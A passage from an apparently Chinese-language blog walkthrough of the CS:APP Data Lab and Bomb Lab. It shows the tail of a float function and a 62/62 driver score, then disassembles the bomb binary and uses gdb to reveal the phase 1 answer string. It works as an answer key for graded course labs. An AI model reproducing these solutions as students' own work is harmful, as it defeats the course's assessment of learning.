</span><span id=__span-13-5><a id=__codelineno-13-5 name=__codelineno-13-5></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>-126</span><span class=p>)</span>
</span><span id=__span-13-6><a id=__codelineno-13-6 name=__codelineno-13-6></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>149</span><span class=p>);</span>
</span><span id=__span-13-7><a id=__codelineno-13-7 name=__codelineno-13-7></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=mi>127</span><span class=p>)</span>
</span><span id=__span-13-8><a id=__codelineno-13-8 name=__codelineno-13-8></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>x</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>127</span><span class=p>)</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>23</span><span class=p>;</span>
</span><span id=__span-13-9><a id=__codelineno-13-9 name=__codelineno-13-9></a><span class=w>    </span><span class=k>else</span>
</span><span id=__span-13-10><a id=__codelineno-13-10 name=__codelineno-13-10></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=mh>0xFF</span><span class=p>)</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=mi>23</span><span class=p>;</span>
</span><span id=__span-13-11><a id=__codelineno-13-11 name=__codelineno-13-11></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>最终结果：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-14-1> 1</a></span>
<span class=normal><a href=#__codelineno-14-2> 2</a></span>
<span class=normal><a href=#__codelineno-14-3> 3</a></span>
<span class=normal><a href=#__codelineno-14-4> 4</a></span>
<span class=normal><a href=#__codelineno-14-5> 5</a></span>
<span class=normal><a href=#__codelineno-14-6> 6</a></span>
<span class=normal><a href=#__codelineno-14-7> 7</a></span>
<span class=normal><a href=#__codelineno-14-8> 8</a></span>
<span class=normal><a href=#__codelineno-14-9> 9</a></span>
<span class=normal><a href=#__codelineno-14-10>10</a></span>
<span class=normal><a href=#__codelineno-14-11>11</a></span>
<span class=normal><a href=#__codelineno-14-12>12</a></span>
<span class=normal><a href=#__codelineno-14-13>13</a></span>
<span class=normal><a href=#__codelineno-14-14>14</a></span>
<span class=normal><a href=#__codelineno-14-15>15</a></span>
<span class=normal><a href=#__codelineno-14-16>16</a></span>
<span class=normal><a href=#__codelineno-14-17>17</a></span>
<span class=normal><a href=#__codelineno-14-18>18</a></span>
<span class=normal><a href=#__codelineno-14-19>19</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-14-1><a id=__codelineno-14-1 name=__codelineno-14-1></a><span class=m>01</span>-Data-Lab$<span class=w> </span>make<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./driver.pl
</span><span id=__span-14-2><a id=__codelineno-14-2 name=__codelineno-14-2></a>...
</span><span id=__span-14-3><a id=__codelineno-14-3 name=__codelineno-14-3></a>Correctness<span class=w> </span>Results<span class=w>     </span>Perf<span class=w> </span>Results
</span><span id=__span-14-4><a id=__codelineno-14-4 name=__codelineno-14-4></a>Points<span class=w>  </span>Rating<span class=w>  </span>Errors<span class=w>  </span>Points<span class=w>  </span>Ops<span class=w>     </span>Puzzle
</span><span id=__span-14-5><a id=__codelineno-14-5 name=__codelineno-14-5></a><span class=m>1</span><span class=w>       </span><span class=m>1</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>8</span><span class=w>       </span>bitXor
</span><span id=__span-14-6><a id=__codelineno-14-6 name=__codelineno-14-6></a><span class=m>1</span><span class=w>       </span><span class=m>1</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>1</span><span class=w>       </span>tmin
</span><span id=__span-14-7><a id=__codelineno-14-7 name=__codelineno-14-7></a><span class=m>1</span><span class=w>       </span><span class=m>1</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>8</span><span class=w>       </span>isTmax
</span><span id=__span-14-8><a id=__codelineno-14-8 name=__codelineno-14-8></a><span class=m>2</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>7</span><span class=w>       </span>allOddBits
</span><span id=__span-14-9><a id=__codelineno-14-9 name=__codelineno-14-9></a><span class=m>2</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>2</span><span class=w>       </span>negate
</span><span id=__span-14-10><a id=__codelineno-14-10 name=__codelineno-14-10></a><span class=m>3</span><span class=w>       </span><span class=m>3</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>10</span><span class=w>      </span>isAsciiDigit
</span><span id=__span-14-11><a id=__codelineno-14-11 name=__codelineno-14-11></a><span class=m>3</span><span class=w>       </span><span class=m>3</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>8</span><span class=w>       </span>conditional
</span><span id=__span-14-12><a id=__codelineno-14-12 name=__codelineno-14-12></a><span class=m>3</span><span class=w>       </span><span class=m>3</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>21</span><span class=w>      </span>isLessOrEqual
</span><span id=__span-14-13><a id=__codelineno-14-13 name=__codelineno-14-13></a><span class=m>4</span><span class=w>       </span><span class=m>4</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>5</span><span class=w>       </span>logicalNeg
</span><span id=__span-14-14><a id=__codelineno-14-14 name=__codelineno-14-14></a><span class=m>4</span><span class=w>       </span><span class=m>4</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>36</span><span class=w>      </span>howManyBits
</span><span id=__span-14-15><a id=__codelineno-14-15 name=__codelineno-14-15></a><span class=m>4</span><span class=w>       </span><span class=m>4</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>17</span><span class=w>      </span>floatScale2
</span><span id=__span-14-16><a id=__codelineno-14-16 name=__codelineno-14-16></a><span class=m>4</span><span class=w>       </span><span class=m>4</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>18</span><span class=w>      </span>floatFloat2Int
</span><span id=__span-14-17><a id=__codelineno-14-17 name=__codelineno-14-17></a><span class=m>4</span><span class=w>       </span><span class=m>4</span><span class=w>       </span><span class=m>0</span><span class=w>       </span><span class=m>2</span><span class=w>       </span><span class=m>10</span><span class=w>      </span>floatPower2
</span><span id=__span-14-18><a id=__codelineno-14-18 name=__codelineno-14-18></a>
</span><span id=__span-14-19><a id=__codelineno-14-19 name=__codelineno-14-19></a><span class=nv>Score</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=m>62</span>/62<span class=w> </span><span class=o>[</span><span class=m>36</span>/36<span class=w> </span>Corr<span class=w> </span>+<span class=w> </span><span class=m>26</span>/26<span class=w> </span>Perf<span class=o>]</span><span class=w> </span><span class=o>(</span><span class=m>151</span><span class=w> </span>total<span class=w> </span>operators<span class=o>)</span>
</span></code></pre></div></td></tr></table></div> </li> </ol> <h2 id=boom-lab>Boom Lab<a class=headerlink href=#boom-lab title="Permanent link">¶</a></h2> <ol> <li> <p>阅读源码：</p> <p>源码在 <code>bomb.c</code> 中，这个程序的主要逻辑大概是：</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-15-1> 1</a></span>
<span class=normal><a href=#__codelineno-15-2> 2</a></span>
<span class=normal><a href=#__codelineno-15-3> 3</a></span>
<span class=normal><a href=#__codelineno-15-4> 4</a></span>
<span class=normal><a href=#__codelineno-15-5> 5</a></span>
<span class=normal><a href=#__codelineno-15-6> 6</a></span>
<span class=normal><a href=#__codelineno-15-7> 7</a></span>
<span class=normal><a href=#__codelineno-15-8> 8</a></span>
<span class=normal><a href=#__codelineno-15-9> 9</a></span>
<span class=normal><a href=#__codelineno-15-10>10</a></span>
<span class=normal><a href=#__codelineno-15-11>11</a></span>
<span class=normal><a href=#__codelineno-15-12>12</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-15-1><a id=__codelineno-15-1 name=__codelineno-15-1></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>argc</span><span class=p>,</span><span class=w> </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span><span id=__span-15-2><a id=__codelineno-15-2 name=__codelineno-15-2></a><span class=p>{</span>
</span><span id=__span-15-3><a id=__codelineno-15-3 name=__codelineno-15-3></a><span class=w>    </span><span class=c1>// ...</span>
</span><span id=__span-15-4><a id=__codelineno-15-4 name=__codelineno-15-4></a><span class=w>    </span><span class=n>initialize_bomb</span><span class=p>();</span>
</span><span id=__span-15-5><a id=__codelineno-15-5 name=__codelineno-15-5></a><span class=w>    </span><span class=c1>// ...</span>
</span><span id=__span-15-6><a id=__codelineno-15-6 name=__codelineno-15-6></a><span class=w>    </span><span class=n>input</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>read_line</span><span class=p>();</span>
</span><span id=__span-15-7><a id=__codelineno-15-7 name=__codelineno-15-7></a><span class=w>    </span><span class=n>phase_1</span><span class=p>(</span><span class=n>input</span><span class=p>);</span>
</span><span id=__span-15-8><a id=__codelineno-15-8 name=__codelineno-15-8></a><span class=w>    </span><span class=n>phase_defused</span><span class=p>();</span>
</span><span id=__span-15-9><a id=__codelineno-15-9 name=__codelineno-15-9></a><span class=w>    </span><span class=n>printf</span><span class=p>(</span><span class=s>"Phase 1 defused. How about the next one?</span><span class=se>\n</span><span class=s>"</span><span class=p>);</span>
</span><span id=__span-15-10><a id=__codelineno-15-10 name=__codelineno-15-10></a><span class=w>    </span><span class=c1>// ...</span>
</span><span id=__span-15-11><a id=__codelineno-15-11 name=__codelineno-15-11></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-15-12><a id=__codelineno-15-12 name=__codelineno-15-12></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <p>可以看到，这个程序的每个阶段都是通过 <code>phase_x</code> 函数来实现的，而 <code>phase_x</code> 函数的参数是 <code>input</code>，也就是我们输入的字符串。所以，我们的目标就是找到每个阶段的 <code>input</code>，然后通过分析 <code>phase_x</code> 函数来找到正确的 <code>input</code>。</p> <p>首先让我们来反编译一下整个 <code>bomb</code> 这个二进制程序：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-16-1>1</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-16-1><a id=__codelineno-16-1 name=__codelineno-16-1></a>objdump<span class=w> </span>-d<span class=w> </span>bomb<span class=w> </span>&gt;<span class=w> </span>bomb.asm
</span></code></pre></div></td></tr></table></div> <div class="admonition note"> <p class=admonition-title>x86-64寄存器传参</p> <p><a href=https://slide.huh.moe/02/7>x86-64 架构的寄存器</a>：</p> <ul> <li>第一个参数：%rdi</li> <li>第二个参数：%rsi</li> <li>第三个参数：%rdx</li> <li>第四个参数：%rcx</li> <li>第五个参数：%r8</li> <li>第六个参数：%r9</li> <li>第七个参数及以上：栈传参</li> <li>被调用者保存：%rbx, %rbp, %rsp, %r12, %r13, %r14, %r15</li> <li>调用者保存：%rdi, %rsi, %rdx, %rcx, %rax, %r8, %r9, %r10, %r11</li> <li>保存返回值的寄存器：%rax</li> <li>栈指针：%rsp</li> <li>指令指针：%rip</li> </ul> </div> </li> <li> <h3 id=phase-1>Phase 1<a class=headerlink href=#phase-1 title="Permanent link">¶</a></h3> <p>看到第一阶段的代码，如下：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-17-1>1</a></span>
<span class=normal><a href=#__codelineno-17-2>2</a></span>
<span class=normal><a href=#__codelineno-17-3>3</a></span>
<span class=normal><a href=#__codelineno-17-4>4</a></span>
<span class=normal><a href=#__codelineno-17-5>5</a></span>
<span class=normal><a href=#__codelineno-17-6>6</a></span>
<span class=normal><a href=#__codelineno-17-7>7</a></span>
<span class=normal><a href=#__codelineno-17-8>8</a></span>
<span class=normal><a href=#__codelineno-17-9>9</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-17-1><a id=__codelineno-17-1 name=__codelineno-17-1></a><span class=err>0000000000400</span><span class=nf>ee0</span><span class=w> </span><span class=err>&lt;</span><span class=no>phase_1</span><span class=err>&gt;</span><span class=p>:</span>
</span><span id=__span-17-2><a id=__codelineno-17-2 name=__codelineno-17-2></a><span class=err>400</span><span class=nl>ee0:</span><span class=w> </span><span class=err>48</span><span class=w> </span><span class=err>83</span><span class=w> </span><span class=nf>ec</span><span class=w> </span><span class=mi>08</span><span class=w>             </span><span class=no>sub</span><span class=w>    </span><span class=no>$0x8</span><span class=p>,</span><span class=nv>%rsp</span>
</span><span id=__span-17-3><a id=__codelineno-17-3 name=__codelineno-17-3></a><span class=err>400</span><span class=nl>ee4:</span><span class=w> </span><span class=nf>be</span><span class=w> </span><span class=mi>00</span><span class=w> </span><span class=mi>24</span><span class=w> </span><span class=mi>40</span><span class=w> </span><span class=mi>00</span><span class=w>          </span><span class=no>mov</span><span class=w>    </span><span class=no>$0x402400</span><span class=p>,</span><span class=nv>%esi</span>
</span><span id=__span-17-4><a id=__codelineno-17-4 name=__codelineno-17-4></a><span class=err>400</span><span class=nl>ee9:</span><span class=w> </span><span class=nf>e8</span><span class=w> </span><span class=mi>4</span><span class=no>a</span><span class=w> </span><span class=mi>04</span><span class=w> </span><span class=mi>00</span><span class=w> </span><span class=mi>00</span><span class=w>          </span><span class=no>call</span><span class=w>   </span><span class=mh>401338</span> <span class=p>&lt;</span><span class=no>strings_not_equal</span><span class=p>&gt;</span>
</span><span id=__span-17-5><a id=__codelineno-17-5 name=__codelineno-17-5></a><span class=err>400</span><span class=nl>eee:</span><span class=w> </span><span class=err>85</span><span class=w> </span><span class=nf>c0</span><span class=w>                   </span><span class=no>test</span><span class=w>   </span><span class=nv>%eax</span><span class=p>,</span><span class=nv>%eax</span>
</span><span id=__span-17-6><a id=__codelineno-17-6 name=__codelineno-17-6></a><span class=err>400</span><span class=nl>ef0:</span><span class=w> </span><span class=err>74</span><span class=w> </span><span class=err>05</span><span class=w>                   </span><span class=nf>je</span><span class=w>     </span><span class=mh>400ef7</span> <span class=p>&lt;</span><span class=no>phase_1</span><span class=p>+</span><span class=mi>0x17</span><span class=p>&gt;</span>
</span><span id=__span-17-7><a id=__codelineno-17-7 name=__codelineno-17-7></a><span class=err>400</span><span class=nl>ef2:</span><span class=w> </span><span class=nf>e8</span><span class=w> </span><span class=mi>43</span><span class=w> </span><span class=mi>05</span><span class=w> </span><span class=mi>00</span><span class=w> </span><span class=mi>00</span><span class=w>          </span><span class=no>call</span><span class=w>   </span><span class=mh>40143a</span> <span class=p>&lt;</span><span class=no>explode_bomb</span><span class=p>&gt;</span>
</span><span id=__span-17-8><a id=__codelineno-17-8 name=__codelineno-17-8></a><span class=err>400</span><span class=nl>ef7:</span><span class=w> </span><span class=err>48</span><span class=w> </span><span class=err>83</span><span class=w> </span><span class=nf>c4</span><span class=w> </span><span class=mi>08</span><span class=w>             </span><span class=no>add</span><span class=w>    </span><span class=no>$0x8</span><span class=p>,</span><span class=nv>%rsp</span>
</span><span id=__span-17-9><a id=__codelineno-17-9 name=__codelineno-17-9></a><span class=err>400</span><span class=nl>efb:</span><span class=w> </span><span class=nf>c3</span><span class=w>                      </span><span class=no>ret</span>
</span></code></pre></div></td></tr></table></div> <p>先来简单观察下这段程序在做什么，<code>call</code> 的两行就是调用 <code>strings_not_equal</code> 和 <code>explode_bomb</code> 这两个函数的，而这里 <code>%esi</code> 对应的是第二个参数，第一个参数呢？当然就是我们拆弹时需要输入的字符串了，存放在 <code>%edi</code>里，也就是 <code>phase_1(input)</code>里的 <code>input</code>。之后的 <code>test</code> 是用来判断函数的返回值 <code>%eax</code> 是否为 0， 如果为 0 则进行跳转，否则炸弹爆炸，所以我们实际上要做的，就是看看 <code>$0x402400</code> 这个地址里对应存放的是什么字符串，也就是拆炸弹的关键了。</p> <blockquote> <p><code>test %eax,%eax</code>：将 <code>%eax</code> 寄存器的值与其自身进行与运算，然后将结果存入 <code>%eax</code>。并且同时设置条件码（Condition Code），其中有一个叫做 <code>ZF</code> 的标志位，如果结果 <code>%eax</code> 的值为 0，则 <code>ZF</code> 为 1，否则为 0。随后的 <code>je</code> 判断条件为 <code>ZF = 1</code>，也就是说，如果 <code>ZF</code> 为 1（这对应我们调用 strings_not_equal 返回了一个零值，代表我们成功匹配），则跳转到 0x400ef7 的地方，否则 <code>call explode_bomb</code>，进而引爆炸弹。</p> </blockquote> <p>解答过程：先 <code>gdb bomb</code>，然后设置断点 <code>b explode_bomb</code> 和 <code>b phase_1</code>，接着运行 <code>r</code>，就会在断点处停下，这里会先让我们输入第一关的密码，随便输入一个抵达断点再说，这里输入 <code>abc</code>。我们断点后可以利用 <code>disas</code> 来看看对应的汇编代码，其实就和我们之前反汇编出来的一致，然后 <code>si</code> 两次直到 <code>mov $0x402400,%esi</code> 执行完毕，再使用 <code>x/s $edi</code> 可以得到我们刚才输入的字符串 <code>abc</code>，再使用 <code>x/s $esi</code> 得到答案：<code>Border relations with Canada have never been better.</code></p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-18-1> 1</a></span>
<span class=normal><a href=#__codelineno-18-2> 2</a></span>
<span class=normal><a href=#__codelineno-18-3> 3</a></span>
<span class=normal><a href=#__codelineno-18-4> 4</a></span>
<span class=normal><a href=#__codelineno-18-5> 5</a></span>
<span class=normal><a href=#__codelineno-18-6> 6</a></span>
<span class=normal><a href=#__codelineno-18-7> 7</a></span>
<span class=normal><a href=#__codelineno-18-8> 8</a></span>
<span class=normal><a href=#__codelineno-18-9> 9</a></span>
<span class=normal><a href=#__codelineno-18-10>10</a></span>
<span class=normal><a href=#__codelineno-18-11>11</a></span>
<span class=normal><a href=#__codelineno-18-12>12</a></span>
<span class=normal><a href=#__codelineno-18-13>13</a></span>
<span class=normal><a href=#__codelineno-18-14>14</a></span>
<span class=normal><a href=#__codelineno-18-15>15</a></span>
<span class=normal><a href=#__codelineno-18-16>16</a></span>
<span class=normal><a href=#__codelineno-18-17>17</a></span>
<span class=normal><a href=#__codelineno-18-18>18</a></span>
<span class=normal><a href=#__codelineno-18-19>19</a></span>
<span class=normal><a href=#__codelineno-18-20>20</a></span>
<span class=normal><a href=#__codelineno-18-21>21</a></span>
<span class=normal><a href=#__codelineno-18-22>22</a></span>
<span class=normal><a href=#__codelineno-18-23>23</a></span>
<span class=normal><a href=#__codelineno-18-24>24</a></span>
<span class=normal><a href=#__codelineno-18-25>25</a></span>
<span class=normal><a href=#__codelineno-18-26>26</a></span>
<span class=normal><a href=#__codelineno-18-27>27</a></span>
<span class=normal><a href=#__codelineno-18-28>28</a></span>
<span class=normal><a href=#__codelineno-18-29>29</a></span>
<span class=normal><a href=#__codelineno-18-30>30</a></span>
<span class=normal><a href=#__codelineno-18-31>31</a></span>
<span class=normal><a href=#__codelineno-18-32>32</a></span>
<span class=normal><a href=#__codelineno-18-33>33</a></span>
<span class=normal><a href=#__codelineno-18-34>34</a></span>
<span class=normal><a href=#__codelineno-18-35>35</a></span>
<span class=normal><a href=#__codelineno-18-36>36</a></span>
<span class=normal><a href=#__codelineno-18-37>37</a></span>
<span class=normal><a href=#__codelineno-18-38>38</a></span>
<span class=normal><a href=#__codelineno-18-39>39</a></span>
<span class=normal><a href=#__codelineno-18-40>40</a></span>
<span class=normal><a href=#__codelineno-18-41>41</a></span>
<span class=normal><a href=#__codelineno-18-42>42</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-18-1><a id=__codelineno-18-1 name=__codelineno-18-1></a>Linux$<span class=w> </span>gdb<span class=w> </span>bomb
</span><span id=__span-18-2><a id=__codelineno-18-2 name=__codelineno-18-2></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>b<span class=w> </span>explode_bomb
</span><span id=__span-18-3><a id=__codelineno-18-3 name=__codelineno-18-3></a>Breakpoint<span class=w> </span><span class=m>1</span><span class=w> </span>at<span class=w> </span>0x40143a
</span><span id=__span-18-4><a id=__codelineno-18-4 name=__codelineno-18-4></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>b<span class=w> </span>phase_1
</span><span id=__span-18-5><a id=__codelineno-18-5 name=__codelineno-18-5></a>Breakpoint<span class=w> </span><span class=m>2</span><span class=w> </span>at<span class=w> </span>0x400ee0
</span><span id=__span-18-6><a id=__codelineno-18-6 name=__codelineno-18-6></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>r
</span><span id=__span-18-7><a id=__codelineno-18-7 name=__codelineno-18-7></a>Welcome<span class=w> </span>to<span class=w> </span>my<span class=w> </span>fiendish<span class=w> </span>little<span class=w> </span>bomb.<span class=w> </span>You<span class=w> </span>have<span class=w> </span><span class=m>6</span><span class=w> </span>phases<span class=w> </span>with
</span><span id=__span-18-8><a id=__codelineno-18-8 name=__codelineno-18-8></a>which<span class=w> </span>to<span class=w> </span>blow<span class=w> </span>yourself<span class=w> </span>up.<span class=w> </span>Have<span class=w> </span>a<span class=w> </span>nice<span class=w> </span>day!
</span><span id=__span-18-9><a id=__codelineno-18-9 name=__codelineno-18-9></a>abc
</span><span id=__span-18-10><a id=__codelineno-18-10 name=__codelineno-18-10></a>
</span><span id=__span-18-11><a id=__codelineno-18-11 name=__codelineno-18-11></a>Breakpoint<span class=w> </span><span class=m>2</span>,<span class=w> </span>0x0000000000400ee0<span class=w> </span><span class=k>in</span><span class=w> </span>phase_1<span class=w> </span><span class=o>()</span>
</span><span id=__span-18-12><a id=__codelineno-18-12 name=__codelineno-18-12></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-18-13><a id=__codelineno-18-13 name=__codelineno-18-13></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>phase_1:
</span><span id=__span-18-14><a id=__codelineno-18-14 name=__codelineno-18-14></a><span class=o>=</span>&gt;<span class=w> </span>0x0000000000400ee0<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-18-15><a id=__codelineno-18-15 name=__codelineno-18-15></a>0x0000000000400ee4<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>mov<span class=w>    </span><span class=nv>$0</span>x402400,%esi
</span><span id=__span-18-16><a id=__codelineno-18-16 name=__codelineno-18-16></a>0x0000000000400ee9<span class=w> </span>&lt;+9&gt;:<span class=w>     </span>call<span class=w>   </span>0x401338<span class=w> </span>&lt;strings_not_equal&gt;
</span><span id=__span-18-17><a id=__codelineno-18-17 name=__codelineno-18-17></a>0x0000000000400eee<span class=w> </span>&lt;+14&gt;:<span class=w>    </span><span class=nb>test</span><span class=w>   </span>%eax,%eax
</span><span id=__span-18-18><a id=__codelineno-18-18 name=__codelineno-18-18></a>0x0000000000400ef0<span class=w> </span>&lt;+16&gt;:<span class=w>    </span>je<span class=w>     </span>0x400ef7<span class=w> </span>&lt;phase_1+23&gt;
</span><span id=__span-18-19><a id=__codelineno-18-19 name=__codelineno-18-19></a>0x0000000000400ef2<span class=w> </span>&lt;+18&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;
</span><span id=__span-18-20><a id=__codelineno-18-20 name=__codelineno-18-20></a>0x0000000000400ef7<span class=w> </span>&lt;+23&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-18-21><a id=__codelineno-18-21 name=__codelineno-18-21></a>0x0000000000400efb<span class=w> </span>&lt;+27&gt;:<span class=w>    </span>ret
</span><span id=__span-18-22><a id=__codelineno-18-22 name=__codelineno-18-22></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span><span id=__span-18-23><a id=__codelineno-18-23 name=__codelineno-18-23></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>si
</span><span id=__span-18-24><a id=__codelineno-18-24 name=__codelineno-18-24></a>0x0000000000400ee4<span class=w> </span><span class=k>in</span><span class=w> </span>phase_1<span class=w> </span><span class=o>()</span>
</span><span id=__span-18-25><a id=__codelineno-18-25 name=__codelineno-18-25></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>si
</span><span id=__span-18-26><a id=__codelineno-18-26 name=__codelineno-18-26></a>0x0000000000400ee9<span class=w> </span><span class=k>in</span><span class=w> </span>phase_1<span class=w> </span><span class=o>()</span>
</span><span id=__span-18-27><a id=__codelineno-18-27 name=__codelineno-18-27></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>disas
</span><span id=__span-18-28><a id=__codelineno-18-28 name=__codelineno-18-28></a>Dump<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>code<span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span>phase_1:
</span><span id=__span-18-29><a id=__codelineno-18-29 name=__codelineno-18-29></a>0x0000000000400ee0<span class=w> </span>&lt;+0&gt;:<span class=w>     </span>sub<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-18-30><a id=__codelineno-18-30 name=__codelineno-18-30></a>0x0000000000400ee4<span class=w> </span>&lt;+4&gt;:<span class=w>     </span>mov<span class=w>    </span><span class=nv>$0</span>x402400,%esi
</span><span id=__span-18-31><a id=__codelineno-18-31 name=__codelineno-18-31></a><span class=o>=</span>&gt;<span class=w> </span>0x0000000000400ee9<span class=w> </span>&lt;+9&gt;:<span class=w>     </span>call<span class=w>   </span>0x401338<span class=w> </span>&lt;strings_not_equal&gt;
</span><span id=__span-18-32><a id=__codelineno-18-32 name=__codelineno-18-32></a>0x0000000000400eee<span class=w> </span>&lt;+14&gt;:<span class=w>    </span><span class=nb>test</span><span class=w>   </span>%eax,%eax
</span><span id=__span-18-33><a id=__codelineno-18-33 name=__codelineno-18-33></a>0x0000000000400ef0<span class=w> </span>&lt;+16&gt;:<span class=w>    </span>je<span class=w>     </span>0x400ef7<span class=w> </span>&lt;phase_1+23&gt;
</span><span id=__span-18-34><a id=__codelineno-18-34 name=__codelineno-18-34></a>0x0000000000400ef2<span class=w> </span>&lt;+18&gt;:<span class=w>    </span>call<span class=w>   </span>0x40143a<span class=w> </span>&lt;explode_bomb&gt;
</span><span id=__span-18-35><a id=__codelineno-18-35 name=__codelineno-18-35></a>0x0000000000400ef7<span class=w> </span>&lt;+23&gt;:<span class=w>    </span>add<span class=w>    </span><span class=nv>$0</span>x8,%rsp
</span><span id=__span-18-36><a id=__codelineno-18-36 name=__codelineno-18-36></a>0x0000000000400efb<span class=w> </span>&lt;+27&gt;:<span class=w>    </span>ret
</span><span id=__span-18-37><a id=__codelineno-18-37 name=__codelineno-18-37></a>End<span class=w> </span>of<span class=w> </span>assembler<span class=w> </span>dump.
</span><span id=__span-18-38><a id=__codelineno-18-38 name=__codelineno-18-38></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x/s<span class=w> </span><span class=nv>$edi</span>
</span><span id=__span-18-39><a id=__codelineno-18-39 name=__codelineno-18-39></a>0x603780<span class=w> </span>&lt;input_strings&gt;:<span class=w>       </span><span class=s2>"abc"</span>
</span><span id=__span-18-40><a id=__codelineno-18-40 name=__codelineno-18-40></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>x/s<span class=w> </span><span class=nv>$esi</span>
</span><span id=__span-18-41><a id=__codelineno-18-41 name=__codelineno-18-41></a>0x402400:<span class=w>       </span><span class=s2>"Border relations with Canada have never been better."</span>
</span><span id=__span-18-42><a id=__codelineno-18-42 name=__codelineno-18-42></a><span class=o>(</span>gdb<span class=o>)</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> <p>为了不用每次都重复打断点，<code>gdb</code> 有一个很实用的功能，就是我们可以使用 <code>.gdbinit</code> 文件来设置 <code>gdb</code> 进入时的一些默认配置，这样我们就不用每次都手动输入一大堆的指令。为了实现此功能，我们首先进行如下配置：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-19-1>1</a></span>
<span class=normal><a href=#__codelineno-19-2>2</a></span>
<span class=normal><a href=#__codelineno-19-3>3</a></span>
<span class=normal><a href=#__codelineno-19-4>4</a></span>
<span class=normal><a href=#__codelineno-19-5>5</a></span>
<span class=normal><a href=#__codelineno-19-6>6</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-19-1><a id=__codelineno-19-1 name=__codelineno-19-1></a><span class=c1># 创建当前目录下的 .gdbinit 文件</span>
